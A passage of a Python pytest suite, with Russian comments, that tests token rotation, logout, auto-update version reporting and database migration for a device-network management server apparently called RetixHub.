        monkeypatch.setattr(api_client, "TOKEN_ROTATE_SECONDS", 0)
        monkeypatch.setattr(api_client, "NEXT_TOKEN_RETRY", 0)
        ctx.company("firma1")
        t1 = ctx.register("firma1")["token"]
        lost = ctx.api.get("/api/me", headers=ctx.h(t1)).headers["x-retix-token"]   # ответ «потерялся»
        for _ in range(3):
            r = ctx.api.get("/api/me", headers=ctx.h(t1))
            assert r.status_code == 200
        t3 = r.headers["x-retix-token"]
        assert t3 != lost
        assert ctx.api.get("/api/me", headers=ctx.h(t3)).status_code == 200
        # невостребованный токен — просто недействителен, ПК не отключается
        assert ctx.api.get("/api/me", headers=ctx.h(lost)).status_code == 401
        assert ctx.api.get("/api/me", headers=ctx.h(t3)).json()["status"] == "active"

    def test_no_rotation_before_interval(self, ctx):
        ctx.company("firma1")
        t = ctx.register("firma1")["token"]
        assert "x-retix-token" not in ctx.api.get("/api/me", headers=ctx.h(t)).headers

    def test_logout_revokes_token_and_peer(self, ctx, net):
        ctx.company("firma1")
        d = ctx.register("firma1")
        assert ctx.api.post("/api/logout", headers=ctx.h(d["token"])).json() == {"ok": True}
        assert ctx.api.get("/api/me", headers=ctx.h(d["token"])).status_code == 401
        assert d["_key"] not in net["peers"]
        assert ctx.register("firma1", key=d["_key"])["status"] == "active"   # вход заново — без одобрения

    def test_client_version_for_autoupdate(self, ctx):
        import hashlib
        import os
        from app.config import DOWNLOADS_DIR
        c = ctx.TestClient(ctx.app)
        os.makedirs(DOWNLOADS_DIR, exist_ok=True)
        assert c.get("/api/client/version").json() == {"version": None}
        files = {"RetixHub_Setup_1.0.9.exe": b"MZ-109", "RetixHub_Setup_1.0.10.exe": b"MZ-1010" * 100}
        for name, data in files.items():
            with open(os.path.join(DOWNLOADS_DIR, name), "wb") as f:
                f.write(data)
        try:
            info = c.get("/api/client/version").json()
            assert info["version"] == "1.0.10" and info["size"] == 700
            assert info["sha256"] == hashlib.sha256(b"MZ-1010" * 100).hexdigest()
            assert c.get(info["url"]).content == b"MZ-1010" * 100
        finally:
            for name in files:
                os.remove(os.path.join(DOWNLOADS_DIR, name))

    def test_old_database_is_migrated(self, monkeypatch, tmp_path):
        import sqlite3
        from app import db
        path = tmp_path / "old.db"
        old = sqlite3.connect(path)
        old.executescript("""CREATE TABLE companies (id INTEGER PRIMARY KEY, login TEXT, name TEXT DEFAULT '',
            cabinet_pass_hash TEXT, join_pass_hash TEXT, subnet_index INTEGER, max_devices INTEGER DEFAULT 20,
            require_approval INTEGER DEFAULT 0, full_lan INTEGER DEFAULT 0, share_name TEXT DEFAULT 'share',
            share_ports TEXT DEFAULT '445', is_active INTEGER DEFAULT 1, created_at TEXT);
            CREATE TABLE devices (id INTEGER PRIMARY KEY, company_id INTEGER, name TEXT, hostname TEXT DEFAULT '',
            public_key TEXT UNIQUE, ip TEXT UNIQUE, token_hash TEXT UNIQUE, is_share_host INTEGER DEFAULT 0,
            is_blocked INTEGER DEFAULT 0, is_approved INTEGER DEFAULT 1, client_version TEXT DEFAULT '',
            last_handshake INTEGER DEFAULT 0, endpoint TEXT DEFAULT '', last_seen TEXT, created_at TEXT);
            INSERT INTO devices(company_id, name, public_key, ip, token_hash) VALUES (1, 'PC', 'k', '10.66.1.2', 'h');""")
        old.commit(); old.close()
        monkeypatch.setattr(db, "DB_PATH", str(path))
        db.init(); db.init()   # повторный запуск ничего не ломает
        conn = db.connect()
        row = conn.execute("SELECT token_hash, token_next_hash, token_set_at FROM devices").fetchone()
        assert tuple(row) == ("h", None, 0)
        conn.execute("SELECT COUNT(*) FROM token_history").fetchone()
